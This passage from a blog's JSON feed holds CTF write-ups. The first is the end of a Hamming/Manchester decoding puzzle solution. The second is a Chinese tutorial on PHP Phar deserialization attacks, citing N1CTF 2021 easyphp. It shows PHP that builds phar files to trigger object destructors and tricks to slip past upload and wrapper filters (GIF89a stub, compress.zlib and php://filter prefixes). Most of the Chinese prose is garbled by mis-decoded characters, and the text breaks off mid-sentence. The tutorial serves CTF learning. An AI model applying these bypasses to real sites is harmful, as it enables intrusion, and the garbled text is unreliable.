class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ind <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"number\">1</span>&lt;&lt;ind)&amp;code:</span><br><span class=\"line\">            wrong = wrong ^ (ind+<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> wrong:</span><br><span class=\"line\">        code = code ^ (<span class=\"number\">1</span>&lt;&lt;(wrong-<span class=\"number\">1</span>))</span><br><span class=\"line\">    retStr = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ind <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ind+<span class=\"number\">1</span>)&amp;(ind): <span class=\"comment\"># Not parity check bit</span></span><br><span class=\"line\">            retStr = retStr + (<span class=\"string\">&quot;1&quot;</span> <span class=\"keyword\">if</span> code&amp;(<span class=\"number\">1</span>&lt;&lt;ind) <span class=\"keyword\">else</span> <span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> retStr[::-<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Hamming</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    retStr = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ind <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(message),<span class=\"number\">15</span>):</span><br><span class=\"line\">        retStr = retStr + HammingBolck(message[ind:ind+<span class=\"number\">15</span>])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> retStr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">HammingInv</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    retStr = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ind <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(message),<span class=\"number\">20</span>):</span><br><span class=\"line\">        retStr = retStr + HammingBolckInv(message[ind:ind+<span class=\"number\">20</span>])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> retStr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">manchester</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    retStr = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> message:</span><br><span class=\"line\">        retStr += <span class=\"string\">&quot;01&quot;</span> <span class=\"keyword\">if</span> char==<span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">else</span> <span class=\"string\">&quot;10&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> retStr</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">manchesterInv</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    retStr = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ind <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(message), <span class=\"number\">2</span>):</span><br><span class=\"line\">        char = message[ind]</span><br><span class=\"line\">        retStr += <span class=\"string\">&quot;0&quot;</span> <span class=\"keyword\">if</span> char==<span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">else</span> <span class=\"string\">&quot;1&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> retStr</span><br><span class=\"line\"></span><br><span class=\"line\">bit_string=bit_string[::-<span class=\"number\">1</span>]</span><br><span class=\"line\">bit_string = HammingInv(manchesterInv(bit_string))[::-<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>, <span class=\"built_in\">len</span>(bit_string)+<span class=\"number\">10</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> x%<span class=\"number\">10</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">        start = x - <span class=\"number\">9</span></span><br><span class=\"line\">        end = x - <span class=\"number\">1</span></span><br><span class=\"line\">        message = <span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(bit_string[start:end],<span class=\"number\">2</span>)) + message</span><br><span class=\"line\"><span class=\"built_in\">print</span>(message)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"7-Final-Words\"><a href=\"#7-Final-Words\" class=\"headerlink\" title=\"7. Final Words\"></a>7. Final Words</h3><p>In my eyes, a good misc problem should not be an annoying puzzle. Steps to solve a misc problem have to be reasonable. For example, in this problem, Manchester coding is applied after the application of Hamming coding: thatâ€™s because the former is channel coding, and the latter is source coding. We shouldnâ€™t just pick some random encryption and apply it to plaintext.</p>\n<p> I have made my best to make the solving process more natural. I hope you enjoy digging deep into the problem. Youâ€™ll earn much more fun than those who can just use tools written by others without understanding fundamental principles (like me).</p>\n<p>ã”æ­¦é‹ã‚’ï¼</p>\n",
            "tags": [
                "Misc",
                "Write-Up",
                "å‡ºé¢˜",
                "English"
            ]
        },
        {
            "id": "http://cubicy.icu/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/",
            "url": "http://cubicy.icu/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/",
            "title": "æµ…è°ˆPharååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ï¼šN1CTF 2021 easyphp & å®‰æ´µæ¯2021 EZ_TP",
            "date_published": "2021-11-28T05:35:00.000Z",
            "content_html": "<h1 id=\"Phar\"><a href=\"#Phar\" class=\"headerlink\" title=\"Phar\"></a>Phar</h1><h2 id=\"ä»€ä¹ˆæ˜¯Phar\"><a href=\"#ä»€ä¹ˆæ˜¯Phar\" class=\"headerlink\" title=\"ä»€ä¹ˆæ˜¯Phar\"></a>ä»€ä¹ˆæ˜¯Phar</h2><blockquote>\n<p>PHp ARchive, like a Java JAR, but for PHP.</p>\n</blockquote>\n<p>pharï¼ˆPHp ARchiveï¼‰æ˜¯ç±»ä¼¼äºJARçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ã€‚PHP â‰¥5.3å¯¹Pharåç¼€æ–‡ä»¶æ˜¯é»˜è®¤å¼€å¯æ”¯æŒçš„ï¼Œä¸éœ€è¦ä»»ä½•å…¶ä»–çš„å®‰è£…å°±å¯ä»¥ä½¿ç”¨å®ƒã€‚</p>\n<blockquote>\n<p>pharæ‰©å±•æä¾›äº†ä¸€ç§å°†æ•´ä¸ªPHPåº”ç”¨ç¨‹åºæ”¾å…¥.pharæ–‡ä»¶ä¸­çš„æ–¹æ³•ï¼Œä»¥æ–¹ä¾¿ç§»åŠ¨ã€å®‰è£…ã€‚.pharæ–‡ä»¶çš„æœ€å¤§ç‰¹ç‚¹æ˜¯å°†å‡ ä¸ªæ–‡ä»¶ç»„åˆæˆä¸€ä¸ªæ–‡ä»¶çš„ä¾¿æ·æ–¹å¼ï¼Œ.pharæ–‡ä»¶æä¾›äº†ä¸€ç§å°†å®Œæ•´çš„PHPç¨‹åºåˆ†å¸ƒåœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å¹¶ä»è¯¥æ–‡ä»¶ä¸­è¿è¡Œçš„æ–¹æ³•ã€‚</p>\n</blockquote>\n<p>è¯´ç™½äº†ï¼Œå°±æ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œä½†æ˜¯ä¸æ­¢èƒ½æ”¾å‹ç¼©æ–‡ä»¶è¿›å»ã€‚</p>\n<p>åœ¨åšè¿›ä¸€æ­¥æ¢ç©¶ä¹‹å‰éœ€è¦å…ˆè°ƒæ•´é…ç½®ï¼Œå› ä¸ºå¯¹äºPharæ–‡ä»¶çš„ç›¸å…³æ“ä½œï¼Œphpç¼ºçœçŠ¶æ€æ˜¯åªè¯»çš„ï¼ˆä¹Ÿå°±æ˜¯è¯´å•çº¯ä½¿ç”¨Pharæ–‡ä»¶ä¸éœ€è¦ä»»ä½•çš„è°ƒæ•´é…ç½®ï¼‰ã€‚ä½†æ˜¯å› ä¸ºæˆ‘ä»¬ç°åœ¨éœ€è¦åˆ›å»ºä¸€ä¸ªè‡ªå·±çš„Pharæ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦å…è®¸å†™å…¥Pharæ–‡ä»¶ï¼Œè¿™éœ€è¦ä¿®æ”¹ä¸€ä¸‹Â <code>php.ini</code></p>\n<p>æ‰“å¼€Â <code>php.ini</code>ï¼Œæ‰¾åˆ°Â <code>phar.readonly</code>Â æŒ‡ä»¤è¡Œï¼Œä¿®æ”¹æˆï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">phar.<span class=\"keyword\">readonly</span> = <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n\n<p>å³å¯ã€‚</p>\n<hr>\n<h2 id=\"Pharæ–‡ä»¶æ ¼å¼\"><a href=\"#Pharæ–‡ä»¶æ ¼å¼\" class=\"headerlink\" title=\"Pharæ–‡ä»¶æ ¼å¼\"></a>Pharæ–‡ä»¶æ ¼å¼</h2><p>Pharæ–‡ä»¶ç”±å››éƒ¨åˆ†ç»„æˆï¼š</p>\n<p><strong>1.stub</strong></p>\n<p>stubæ˜¯pharæ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼Œæ ¼å¼ä¸º<code>xxxxxx&lt;?php ...;__HALT_COMPILER();?&gt;</code>ï¼Œxxxxxxå¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ï¼ŒåŒ…æ‹¬ç•™ç©ºï¼Œä¸”phpé—­åˆç¬¦ä¸æœ€åä¸€ä¸ªåˆ†å·ä¹‹é—´ä¸èƒ½æœ‰å¤šäºä¸€ä¸ªçš„ç©ºæ ¼ç¬¦ã€‚å¦å¤–phpé—­åˆç¬¦ä¹Ÿå¯çœç•¥ã€‚</p>\n<p><strong>2.manifest describing the contents</strong></p>\n<p>è¯¥åŒºåŸŸå­˜æ”¾pharåŒ…çš„å±æ€§ä¿¡æ¯ï¼Œå…è®¸æ¯ä¸ªæ–‡ä»¶æŒ‡å®šæ–‡ä»¶å‹ç¼©ã€æ–‡ä»¶æƒé™ï¼Œç”šè‡³æ˜¯ç”¨æˆ·å®šä¹‰çš„å…ƒæ•°æ®ï¼Œå¦‚æ–‡ä»¶ç”¨æˆ·æˆ–ç»„ã€‚</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/format.png\" loading=\"lazy\"></p>\n<p>è¿™é‡Œé¢çš„metadataä»¥serializeå½¢å¼å‚¨å­˜ï¼Œä¸ºååºåˆ—åŒ–æ¼æ´åŸ‹ä¸‹äº†ä¼ç¬”ã€‚</p>\n<p><strong>3.file contents</strong></p>\n<p>è¢«å‹ç¼©çš„ç”¨æˆ·æ·»åŠ çš„æ–‡ä»¶å†…å®¹</p>\n<p>4.<strong>signature</strong></p>\n<p>å¯é€‰ï¼Œpharæ–‡ä»¶çš„ç­¾åï¼Œå…è®¸çš„æœ‰MD5, SHA1, SHA256, SHA512å’ŒOPENSSL.</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/signature.png\" alt=\"signature\" loading=\"lazy\"></p>\n<p>è¿™éƒ¨åˆ†ä»¥<code>GBMB</code>ï¼ˆ47 42 4d 42ï¼‰ç»“å°¾ã€‚</p>\n<p>éœ€è¦æ³¨æ„ï¼Œstubä¸ä¸€å®šè¦åœ¨æ–‡ä»¶å¼€å¤´ã€‚</p>\n<h2 id=\"åˆ©ç”¨æ–¹å¼\"><a href=\"#åˆ©ç”¨æ–¹å¼\" class=\"headerlink\" title=\"åˆ©ç”¨æ–¹å¼\"></a>åˆ©ç”¨æ–¹å¼</h2><p>åœ¨2018 Black Hatä¸Šï¼Œå®‰å…¨ç ”ç©¶å‘˜<code>Sam Thomas</code>åˆ†äº«äº†è®®é¢˜<code>Itâ€™s a PHP unserialization vulnerability Jim, but not as we know it</code> .</p>\n<p><a href=\"https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf\">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf</a></p>\n<blockquote>\n<p>åˆ©ç”¨pharæ–‡ä»¶ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„<strong>meta-data</strong>è¿™ä¸€ç‰¹æ€§ï¼Œæ‹“å±•äº†phpååºåˆ—åŒ–æ¼æ´çš„æ”»å‡»é¢ã€‚è¯¥æ–¹æ³•åœ¨<strong>æ–‡ä»¶ç³»ç»Ÿå‡½æ•°</strong>ï¼ˆfile_exists()ã€is_dir()ç­‰ï¼‰å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆ<strong>phar:&#x2F;&#x2F;ä¼ªåè®®</strong>ï¼Œ<strong>å¯ä»¥ä¸ä¾èµ–unserialize()ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œ</strong>ã€‚</p>\n</blockquote>\n<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶ä¼ å…¥ä»¥ä¸‹å‡½æ•°çš„å‚æ•°ï¼Œå°±æœ‰æ½œåœ¨çš„pharååºåˆ—åŒ–æ¼æ´åˆ©ç”¨å¯èƒ½ï¼š</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/func.png\" loading=\"lazy\"></p>\n<p>è¿˜æœ‰ä¸€äº›åˆ«çš„å‡½æ•°å¯ç”¨ï¼Œå¯å‚è€ƒè¿™ç¯‡ï¼š<a href=\"https://www.freebuf.com/articles/web/205943.html\">https://www.freebuf.com/articles/web/205943.html</a></p>\n<p><strong>è¯•è¯•çœ‹ï¼Ÿ</strong></p>\n<p>æˆ‘ä»¬å…ˆæ¥ç”Ÿæˆä¸€ä¸ªpharï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestObject</span> </span>&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"string\">&quot;phar.phar&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$phar</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"string\">&quot;phar.phar&quot;</span>); <span class=\"comment\">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();</span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class=\"comment\">//è®¾ç½®stub</span></span><br><span class=\"line\">    <span class=\"variable\">$o</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">TestObject</span>();</span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$o</span>); <span class=\"comment\">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;test.txt&quot;</span>, <span class=\"string\">&quot;test&quot;</span>); <span class=\"comment\">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class=\"line\">    <span class=\"comment\">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>æ³¨æ„è¿™è¾¹$oååºåˆ—åŒ–åªä¼šä¿å­˜æ•°æ®ä¸ä¼šä¿å­˜æ–¹æ³•ã€‚æ‰§è¡Œå®Œæ¯•åï¼Œæˆ‘ä»¬æ¥è§‚å¯Ÿpharæ–‡ä»¶çš„å†…å®¹ï¼š</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/hex.png\" loading=\"lazy\"></p>\n<p>GBMBç»“å°¾çš„ç­¾åä»¥åŠåºåˆ—åŒ–åçš„metadataæ¸…æ™°å¯è§ã€‚</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestObject</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Destruct called&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$filename</span> = <span class=\"string\">&#x27;phar://phar.phar/test.txt&#x27;</span>;<span class=\"comment\">//æ—¢ç„¶æ˜¯å‹ç¼©æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å¦‚æ­¤è®¿é—®å…¶ä¸­çš„æŸä¸ªæ–‡ä»¶</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$filename</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>åœ¨ä¸Šé¢çš„ç¨‹åºæ‰§è¡Œä¹‹åï¼Œæˆ‘ä»¬ä¼šå‘ç°å®ƒè¾“å‡ºäº†â€œDestruct calledâ€.è¿™æ˜¯ç”±äºpharè¢«è§£æçš„æ—¶å€™ï¼Œmetadataè¢«ååºåˆ—åŒ–äº†ï¼Œäºæ˜¯è¯¥å®ä¾‹è¢«ææ„æ—¶è°ƒç”¨__destructå‡½æ•°ã€‚è¿™ä¾¿æ˜¯ååºåˆ—åŒ–æ¼æ´çš„æ¥ç”±ã€‚</p>\n<p>PHP â‰¥5.3é»˜è®¤æ”¯æŒpharæ–‡ä»¶ï¼›è€Œåœ¨PHP8ä¸­ï¼Œè¯¥æ¼æ´è¢«ä¿®å¤ï¼šmetadataä¸ä¼šè‡ªåŠ¨è¢«ååºåˆ—åŒ–äº†ã€‚ï¼ˆæ¥æºè¯·æ±‚ï¼‰</p>\n<hr>\n<h2 id=\"phar-æ˜¯ä»€ä¹ˆ\"><a href=\"#phar-æ˜¯ä»€ä¹ˆ\" class=\"headerlink\" title=\"phar:&#x2F;&#x2F;æ˜¯ä»€ä¹ˆ\"></a><strong>phar:&#x2F;&#x2F;æ˜¯ä»€ä¹ˆ</strong></h2><p>å‰é¢æåˆ°ï¼Œæˆ‘ä»¬è§£æpharæ–‡ä»¶å¸¸å¸¸ä½¿ç”¨phar:&#x2F;&#x2F;ä¼ªåè®®ã€‚CTFä¸­ï¼Œç”±äºä¼ªåè®®æä¾›äº†ä¸€ç³»åˆ—å¯¹äºæ–‡ä»¶çš„å°è£…åè®®ï¼Œä½¿å¾—å½“æºç¨‹åºæœ‰å¯æ§çš„æ–‡ä»¶åŒ…å«å‡½æ•°æ—¶ï¼Œæˆ‘ä»¬æœ‰æœºä¼šåˆ©ç”¨è¿™äº›åè®®æ§åˆ¶å…¶è¿”å›å€¼æˆ–æ˜¯å®Œæˆä¸€äº›é¢„æ–™å¤–æ“ä½œï¼ˆä¾‹å¦‚ååºåˆ—åŒ–ï¼‰ã€‚ä½œä¸ºä¼ªåè®®çš„ä¸€ç§ï¼Œç”±äºpharæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å‹ç¼©æ–‡ä»¶ï¼Œæ‰€ä»¥phar:&#x2F;&#x2F;å’Œzip:&#x2F;&#x2F;å…¶å®æœ‰å¾ˆå¤šç›¸ä¼¼ä¹‹å¤„ï¼Œéƒ½å¯ä»¥è®¿é—®å‹ç¼©åŒ…ä¸­çš„å­æ–‡ä»¶ï¼Œå¹¶ä¸”zip:&#x2F;&#x2F;éœ€è¦æ–‡ä»¶ç»å¯¹è·¯å¾„ï¼Œphar:&#x2F;&#x2F;å¹¶ä¸éœ€è¦ã€‚ï¼ˆæ¥æºè¯·æ±‚ï¼‰</p>\n<hr>\n<h2 id=\"å°tricks\"><a href=\"#å°tricks\" class=\"headerlink\" title=\"å°tricks\"></a><strong>å°tricks</strong></h2><h3 id=\"ç»•è¿‡å‰ç¼€è¿‡æ»¤\"><a href=\"#ç»•è¿‡å‰ç¼€è¿‡æ»¤\" class=\"headerlink\" title=\"ç»•è¿‡å‰ç¼€è¿‡æ»¤\"></a>ç»•è¿‡å‰ç¼€è¿‡æ»¤</h3><p>é˜Ÿé‡Œå¸ˆå‚…çš„å‡ ä¸ªexampleå¯ä»¥ç±»æ¯”ä½¿ç”¨ï¼Œéƒ½æ˜¯åœ¨å‰ç¼€éphar:&#x2F;&#x2F;çš„æƒ…å†µä¸‹è°ƒç”¨äº†phar:&#x2F;&#x2F;</p>\n<p>compress.bzip2å’Œcompress.zlib</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$z</span> = <span class=\"string\">&#x27;compress.bzip2://phar:///home/sx/test.phar/test.txt&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$z</span> = <span class=\"string\">&#x27;compress.zlib://phar:///home/sx/test.phar/test.txt&#x27;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$z</span>);</span><br></pre></td></tr></table></figure>\n\n<p>php:&#x2F;&#x2F;</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;php://filter/read=convert.base64-encode/resource=phar://phar.phar&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;php://filter/read=convert.base64-encode/resource=phar://phar.phar&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h3 id=\"ç®€å•çš„ç»•è¿‡\"><a href=\"#ç®€å•çš„ç»•è¿‡\" class=\"headerlink\" title=\"ç®€å•çš„ç»•è¿‡\"></a>ç®€å•çš„ç»•è¿‡</h3><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨stubéƒ¨åˆ†å‰ç¼€ä»»æ„çš„ç‰¹æ€§ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span> -&gt; <span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&#x27;GIF89a&#x27;</span>.<span class=\"string\">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);   <span class=\"comment\">//è®¾ç½® stubï¼Œå¢åŠ  gif æ–‡ä»¶å¤´</span></span><br></pre></td></tr></table></figure>\n\n<p>è¿™å¯ä»¥ç»•è¿‡ä¸€éƒ¨åˆ†å¯¹æ–‡ä»¶å¤´çš„æ£€æµ‹ã€‚</p>\n<hr>\n<h3 id=\"ç»•è¿‡å‰åè„æ•°æ®\"><a href=\"#ç»•è¿‡å‰åè„æ•°æ®\" class=\"headerlink\" title=\"ç»•è¿‡å‰åè„æ•°æ®\"></a>ç»•è¿‡å‰åè„æ•°æ®</h3><p>ç”±äºç­¾åéƒ¨åˆ†çš„å­˜åœ¨ï¼Œphpä¼šæ ¡éªŒæ–‡ä»¶å“ˆå¸Œå€¼ï¼Œå¹¶æ£€æŸ¥æœ«å°¾æ˜¯å¦ä¸ºGBMBï¼Œå¦‚ä¸‹æ˜¯è§£æéƒ¨åˆ†çš„æºç ï¼š</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/src.png\" loading=\"lazy\"></p>\n<p><a href=\"https://github.dev/php/php-src\">https://github.dev/php/php-src</a></p>\n<p>å¯è§ï¼Œå¦‚æœæœ«å°¾ä¸æ˜¯GBMBä¼šç›´æ¥å¯¼è‡´è§£æå¤±è´¥ã€‚</p>\n<p>åœ¨CTFä¸­åˆ©ç”¨è¯¥æ¼æ´éœ€è¦æˆ‘ä»¬å®Œæˆå†™å…¥&#x2F;ä¸Šä¼ pharï¼Œå¹¶è°ƒç”¨æ–‡ä»¶åŒ…å«å‡½æ•°ã€‚æˆ‘ä»¬çŸ¥é“ä¸€å¥è¯æœ¨é©¬ç”±äºæœ‰<code>&lt;?php ?&gt;</code>è¿™æ ·çš„å¤´å°¾æ ‡è¯†å­˜åœ¨ï¼Œå¯ä»¥æ— è§†å‰åè„æ•°æ®ï¼›ç„¶è€Œå¯¹äºpharï¼Œè¿™æ ·çš„éªšæ“ä½œè¢«ç­¾åéƒ¨åˆ†é˜»æ­¢äº†ã€‚æœ‰åŠæ³•ç»•è¿‡å—ï¼Ÿè¯·å‚é˜…ï¼š<a href=\"https://www.php.net/manual/zh/phar.converttoexecutable.php\">https://www.php.net/manual/zh/phar.converttoexecutable.php</a></p>\n<p>åˆ©ç”¨convertToExecutableå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠpharæ–‡ä»¶è½¬ä¸ºå…¶ä»–æ ¼å¼çš„pharæ–‡ä»¶ï¼Œä¾‹å¦‚.tarå’Œ.zipæ ¼å¼ã€‚</p>\n<p>æˆ‘ä»¬ä»¥N1CTF 